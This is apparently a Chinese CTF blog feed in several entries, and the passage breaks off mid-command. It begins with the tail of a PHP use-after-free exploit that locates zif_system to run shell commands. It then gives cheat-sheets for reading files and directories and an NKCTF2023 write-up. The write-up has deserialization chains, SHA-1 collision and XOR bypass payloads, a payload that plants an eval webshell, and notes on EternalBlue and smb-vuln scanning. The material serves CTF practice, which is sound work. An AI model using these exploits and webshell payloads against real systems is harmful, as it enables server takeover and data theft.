variable">$leak</span> <span class="token operator">==</span> <span class="token number">0x10102464c457f</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>                <span class="token keyword">return</span> <span class="token variable">$addr</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>    <span class="token keyword">function</span> <span class="token function">get_system</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token variable">$addr</span> <span class="token operator">=</span> <span class="token variable">$basic_funcs</span><span class="token punctuation">;</span>        <span class="token keyword">do</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>            <span class="token variable">$f_entry</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$f_name</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$f_entry</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$f_name</span> <span class="token operator">==</span> <span class="token number">0x6d6574737973</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>                <span class="token keyword">return</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>            <span class="token variable">$addr</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">0x20</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; while($f_entry != 0);</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>    <span class="token keyword">function</span> <span class="token function">trigger_uaf</span><span class="token punctuation">(</span><span class="token variable">$arg</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token variable">$arg</span> <span class="token operator">=</span> <span class="token function">str_shuffle</span><span class="token punctuation">(</span><span class="token string">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$vuln</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$vuln</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span> <span class="token operator">=</span> <span class="token variable">$arg</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token constant">PHP_OS</span><span class="token punctuation">,</span> <span class="token string">'WIN'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'This PoC is for *nix systems only.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>    <span class="token variable">$n_alloc</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>     <span class="token variable">$contiguous</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$n_alloc</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token variable">$contiguous</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">str_shuffle</span><span class="token punctuation">(</span><span class="token string">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">trigger_uaf</span><span class="token punctuation">(</span><span class="token string">'x'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$abc</span> <span class="token operator">=</span> <span class="token variable">$backtrace</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$helper</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Helper</span><span class="token punctuation">;</span>    <span class="token variable">$helper</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">b</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123; &amp;#125;;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">79</span> <span class="token operator">||</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"UAF failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>    <span class="token variable">$closure_handlers</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$php_heap</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$abc_addr</span> <span class="token operator">=</span> <span class="token variable">$php_heap</span> <span class="token operator">-</span> <span class="token number">0xc8</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token variable">$abc_addr</span> <span class="token operator">+</span> <span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0xa</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$closure_obj</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$binary_leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$closure_handlers</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$base</span> <span class="token operator">=</span> <span class="token function">get_binary_base</span><span class="token punctuation">(</span><span class="token variable">$binary_leak</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Couldn't determine binary base address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$elf</span> <span class="token operator">=</span> <span class="token function">parse_elf</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Couldn't parse ELF header"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span> <span class="token operator">=</span> <span class="token function">get_basic_funcs</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token variable">$elf</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Couldn't get basic_functions address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$zif_system</span> <span class="token operator">=</span> <span class="token function">get_system</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Couldn't get zif_system address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>    <span class="token variable">$fake_obj_offset</span> <span class="token operator">=</span> <span class="token number">0xd0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x110</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$fake_obj_offset</span> <span class="token operator">+</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$closure_obj</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token variable">$abc_addr</span> <span class="token operator">+</span> <span class="token variable">$fake_obj_offset</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0xd0</span> <span class="token operator">+</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0xd0</span> <span class="token operator">+</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token variable">$zif_system</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">(</span><span class="token variable">$helper</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">b</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span class="token function">ctfshow</span><span class="token punctuation">(</span><span class="token string">"指令填写在这里！！！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ob_end_flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>读取文件函数一览表</p><pre><code>highlight_file($filename);show_source($filename);print_r(php_strip_whitespace($filename));print_r(file_get_contents($filename));readfile($filename);print_r(file($filename)); // var_dumpfread(fopen($filename,&quot;r&quot;), $size);include($filename); // 非php代码include_once($filename); // 非php代码require($filename); // 非php代码require_once($filename); // 非php代码print_r(fread(popen(&quot;cat flag&quot;, &quot;r&quot;), $size));print_r(fgets(fopen($filename, &quot;r&quot;))); // 读取一行fpassthru(fopen($filename, &quot;r&quot;)); // 从当前位置一直读取到 EOFprint_r(fgetcsv(fopen($filename,&quot;r&quot;), $size));print_r(fgetss(fopen($filename, &quot;r&quot;))); // 从文件指针中读取一行并过滤掉 HTML 标记print_r(fscanf(fopen(&quot;flag&quot;, &quot;r&quot;),&quot;%s&quot;));print_r(parse_ini_file($filename)); // 失败时返回 false , 成功返回配置数组</code></pre><p>读取目录一览表</p><pre><code>print_r(glob(&quot;*&quot;)); // 列当前目录print_r(glob(&quot;/*&quot;)); // 列根目录print_r(scandir(&quot;.&quot;));print_r(scandir(&quot;/&quot;));$d=opendir(&quot;.&quot;);while(false!==($f=readdir($d)))&#123;echo&quot;$f\n&quot;;&#125;$d=dir(&quot;.&quot;);while(false!==($f=$d-&gt;read()))&#123;echo$f.&quot;\n&quot;;&#125;$a=glob(&quot;/*&quot;);foreach($a as $value)&#123;echo $value.&quot;   &quot;;&#125;$a=new DirectoryIterator(&#39;glob:///*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow刷题记录</title>
      <link href="/2023/04/07/CTFshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/04/07/CTFshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h4 id="本文会一直更新，不会分开多个文章记载刷题记录"><a href="#本文会一直更新，不会分开多个文章记载刷题记录" class="headerlink" title="本文会一直更新，不会分开多个文章记载刷题记录"></a>本文会一直更新，不会分开多个文章记载刷题记录</h4><h5 id="文章只记载最简单的最重要的思路"><a href="#文章只记载最简单的最重要的思路" class="headerlink" title="文章只记载最简单的最重要的思路"></a>文章只记载最简单的最重要的思路</h5><h5 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h5><p>既然是信息泄露，自然不会很难，基本上都是工具一把嗦。</p><pre><code>F12robots.txtjs抓包index.phpswww.zip.git.svnindex.php.swpindex.php.bak.index.php.swo.index.php.swn.DS_Store.hg邮箱，电话号码泄露技术文档editor编辑器探针backup.sql/db/db.mdb抓包返回状态</code></pre><h5 id="爆破-BP"><a href="#爆破-BP" class="headerlink" title="爆破(BP)"></a>爆破(BP)</h5><p>爆破简单的用BP完全足够了，难一点的写个Python脚本。</p><pre><code>Payload set         ----&gt;  custom iterator(自定义迭代器)需要进行base64编码  ----&gt;  payload processing 进行编码设置取消Palyload Encoding编码,因为在进行base64加密的时候在最后可能存在 == 会影响base64加密的结果有多重目录的url可以用number爆破出动态地址，同时记得改一下页面index.php</code></pre><h5 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h5><p>请查看下一篇文章。</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NKCTF2023WP</title>
      <link href="/2023/03/27/NKCTF2023WP/"/>
      <url>/2023/03/27/NKCTF2023WP/</url>
      
        <content type="html"><![CDATA[<h5 id="前话"><a href="#前话" class="headerlink" title="前话"></a>前话</h5><p>这次CTF比赛对我来说难度感觉适中偏难吧，很多题都是可以写的<br>只是因为比赛是团队合作，所以就把难题留给大哥们了。<br>当然，这不是重点，重点是从中学到了啥。</p><h4 id="WriteUp"><a href="#WriteUp" class="headerlink" title="WriteUp"></a>WriteUp</h4><h5 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h5><p><strong>BabyPHP</strong></p><pre><code>&lt;?php    error_reporting(0);    class Welcome&#123;        public $name;        public $arg = &#39;oww!man!!&#39;;        public function __construct()&#123;            $this-&gt;name = &#39;ItS SO CREAZY&#39;;        &#125;        public function __destruct()&#123;            if($this-&gt;name == &#39;welcome_to_NKCTF&#39;)&#123;                echo $this-&gt;arg;            &#125;        &#125;    &#125;    function waf($string)&#123;        if(preg_match(&#39;/f|l|a|g|\*|\?/i&#39;, $string))&#123;            die(&quot;you are bad&quot;);        &#125;    &#125;    class Happy&#123;        public $shell;        public $cmd;        public function __invoke()&#123;            $shell = $this-&gt;shell;            $cmd = $this-&gt;cmd;            waf($cmd);            eval($shell($cmd));        &#125;    &#125;    class Hell0&#123;        public $func;        public function __toString()&#123;            $function = $this-&gt;func;            $function();        &#125;    &#125;    if(isset($_GET[&#39;p&#39;]))&#123;        unserialize($_GET[&#39;p&#39;]);    &#125;else&#123;        highlight_file(__FILE__);    &#125;?&gt;进行反序列化&lt;?phperror_reporting(0);class Welcome&#123;    public $name;    public $arg;    public function __construct()    &#123;        $this-&gt;name = new Hell0();    &#125;&#125;function waf($string)&#123;    if (preg_match(&#39;/f|l|a|g|\*|\?/i&#39;, $string)) &#123;        die(&quot;you are bad&quot;);    &#125;&#125;class Happy&#123;    public $shell;    public $cmd;    public function __construct()    &#123;        $this-&gt;shell = &#39;system&#39;;        // flag*?        $this-&gt;cmd = &#39;cd /;more `php -r &quot;echo chr(102).chr(49).chr(97).chr(103);&quot;`&#39;;    &#125;    public function __invoke()    &#123;        $shell = $this-&gt;shell;        $cmd = $this-&gt;cmd;        waf($cmd);        eval($shell($cmd));    &#125;&#125;class Hell0&#123;    public $func;    public function __construct()    &#123;        $this-&gt;func = new Happy();    &#125;&#125;$a = new Welcome();echo urlencode(serialize($a));</code></pre><p><strong>EazyPHP</strong></p><pre><code>&lt;?php     highlight_file(__FILE__);    error_reporting(0);    if($_GET[&#39;a&#39;] != $_GET[&#39;b&#39;] &amp;&amp; md5($_GET[&#39;a&#39;]) == md5($_GET[&#39;b&#39;]))&#123;        if((string)$_POST[&#39;c&#39;] != (string)$_POST[&#39;d&#39;] &amp;&amp; sha1($_POST[&#39;c&#39;]) === sha1($_POST[&#39;d&#39;]))&#123;            if($_GET[&#39;e&#39;] != 114514 &amp;&amp; intval($_GET[&#39;e&#39;]) == 114514)&#123;                if(isset($_GET[&#39;NS_CTF.go&#39;]))&#123;                    if(isset($_POST[&#39;cmd&#39;]))&#123;                        if(!preg_match(&#39;/[0-9a-zA-Z]/i&#39;, $_POST[&#39;cmd&#39;]))&#123;                            eval($_POST[&#39;cmd&#39;]);                        &#125;else&#123;                            die(&#39;error!!!!!!&#39;);                        &#125;                    &#125;else&#123;                        die(&#39;error!!!!!&#39;);                    &#125;                &#125;else&#123;                    die(&#39;error!!!!&#39;);                &#125;            &#125;else&#123;                die(&#39;error!!!&#39;);            &#125;        &#125;else&#123;            die(&#39;error!!&#39;);        &#125;    &#125;else&#123;        die(&#39;error!&#39;);    &#125;?&gt; error!其中使用[]通配符绕过c=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;d=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1&amp;cmd=(&quot;%13%19%13%14%05%0d&quot;^&quot;%60%60%60%60%60%60&quot;)(&quot;%03%01%14%00%00%06%00&quot;^&quot;%60%60%60%20%2f%60%2a&quot;);</code></pre><p><strong>HardPHP</strong></p><pre><code>&lt;?php// not only ++error_reporting(0);highlight_file(__FILE__);if (isset($_POST[&#39;NKCTF&#39;])) &#123;    $NK = $_POST[&#39;NKCTF&#39;];    if (is_string($NK)) &#123;        if (!preg_match(&quot;/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;,$NK) &amp;&amp; strlen($NK) &lt; 105)&#123;            eval($NK);        &#125;else&#123;            echo(&quot;hacker!!!&quot;);        &#125;    &#125;else&#123;        phpinfo();    &#125;&#125;?&gt;【1】利用自增方法NKCTF=$_=(_/_._)[&#39;$&#39;==&#39;_&#39;];$_++;$__=$_.$_++;$_++;$_++;$_++;$__.=$_;$_++;$_=_.$__.$_;$$_[_]($$_[__]);&amp;_=readfile&amp;__=/flag【2】先传ShellNKCTF=%24_%3D(_%2F_._)%5B___%5D%3B%24__%3D%2B%2B%24_%3B%24_____%3D%2B%2B%24_.%24__%3B%2B%2B%24_%2F%2B%2B%24_%3B%24_%3D_.%24_____.%3D%2B%2B%24_.%2B%2B%24_%3B%24%24_%5B___%5D(%24%24_%5B_%5D)%3B&amp;___=shell_exec&amp;_=echo &#39;&lt;?php eval($_POST[1])?&gt;&#39; &gt;1.php     再输出FLAG1=echo file_get_contents(&#39;/flag&#39;);</code></pre><p><strong>EasyPMS</strong></p><pre><code>禅道系统存在命令执行和权限绕过漏洞，根据0Day漏洞的POC执行就行了</code></pre><h5 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h5><p><strong>Blue取证磁盘</strong></p><pre><code>【预期解】使用永恒之蓝攻击【非预期解】虚拟机直接导入先扫出IP地址使用nmap尝试扫描其他smb漏洞      nmap -P --script=smb-vuln*  IP利用ms09的CVE获取Shell然后打开【严重非预期解】WinHex一把嗦</code></pre><p><strong>三体</strong><br><a href="https://www.bilibili.com/video/BV1Ai4y1V7rg/">老题目了</a></p><pre><code>from PIL import Imagedef decode(im):    width, height = im.size    lst = [ ]    for y in range(height):        for x in range(width):            red, green, blue = im.getpixel((x, y))            if (blue | green | red) == 0:                break                        index = (green &lt;&lt; 8) + blue            lst.append( chr(index) )    return &#39;&#39;.join(lst)def main(filename: str):    all_text = decode(Image.open(filename))    with open(&quot;&#123;&#125;_decode.txt&quot;.format(&#39;.&#39;.join(filename.split(&#39;.&#39;)[:-1])), &quot;w&quot;, encoding = &quot;utf-8&quot;) as f:        f.write(all_text)if __name__ == &#39;__main__&#39;:    main(&#39;三体.bmp&#39;)</code></pre><p><strong>THMaster东方星莲船打到10亿分</strong></p><pre><code>【1】简简单单网上找修改器改分数【2】CheatEngine修改游戏数据</code></pre><p><strong>easy_rgb</strong></p><pre><code>用Kali的工具gaps具体指令自己网上找然后发现三个文档r.txt   g.txt   b.txt按照rgb的顺序每次读一位字符得到压缩包字节流r = &quot;5b04000d663f400000006c6e747a434fbc7d0225c4060b2905cf0a280807372873460041100000ba56b200000000000000006c6e7400000110ea63055a596785d14500010000600745213&quot;g = &quot;0040000ba56b2000000066778f4ac280276f9fb28fb3c282b4fdf7d8a0944bc722bd65b0410083a5492004008200000000006677800000008cc73d1c7630a5f595b000001500800015d38&quot;b = &quot;4310083a54920040080061247309bcac200235fff7778acdfc0401090b3a37c1fcf3000204000d663f40000004000020000061247a20000004dd5985a5d14663000600000a0000004332&quot;data = &quot;&quot;for i in range(len(r)):    try:        data += r[i] + g[i] + b[i]    except:        breakdata += r[-1] + g[-1]with open(&#39;flag.zip&#39;, &#39;wb&#39;) as f:    f.write(bytes.fromhex(data))</code></pre><p><strong>easy_word</strong></p><pre><code>提示如下:小明这个笨蛋，给文档设置了一个密码，但是他自己却忘记了密码，他知道以下信息：1.密码是数学和大小写英语的随机生成的2.hash函数：输出大小 256 bits 内部大小 256 区块大小    512 长度大小 64 字符尺寸 323.密码：h??vO??0 (?号部分为小明已经忘记的位置)  哈希：b75d1224 ... (后面不记得了...)写脚本跑一下import hashlibchars = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;for c1 in chars:    for c2 in chars:        for c3 in chars:            for c4 in chars:                password = &quot;h&#123;&#125;&#123;&#125;vO&#123;&#125;&#123;&#125;0&quot;.format(c1, c2, c3, c4)                hashcode = hashlib.sha256(password.encode()).hexdigest()                if hashcode[:8] == &quot;b75d1224&quot;:                    print(&quot;&#123;&#125;   &#123;&#125;&quot;.format(password, hashcode))                    h4evOF90   b75d1224d1321f5acfe0fb499ff02ab0f15d199e227c77c84c1162340bc6c771发现有一个图片猜测是LSB，直接解密</code></pre><p><strong>first_spam_of_rabbit_year</strong></p><pre><code>文档底下的社会主义核心价值观编码解码为：rabbit 又 move再用佛又曰得出的文本有不可显示字符零宽解密   https://offdev.net/demos/zwsp-steg-js将key和密文清除零宽后分别解密得到新密文最后用rabbit解密   https://www.codeeeee.com/encrypt/rabbit.html</code></pre><p><strong>easy_bmp</strong></p><pre><code>修改宽并使用脚本爆破高显示出部分key解压出一个二维码扫得flag</code></pre><p><strong>baby_music</strong></p><pre><code>WinHex打开发现全是1027和1127盲猜是二进制数据，把1027改为0,1127改为1得到一个zip，里面有脚本压缩包的提示为摩斯密码猜测明文攻击 echo -n 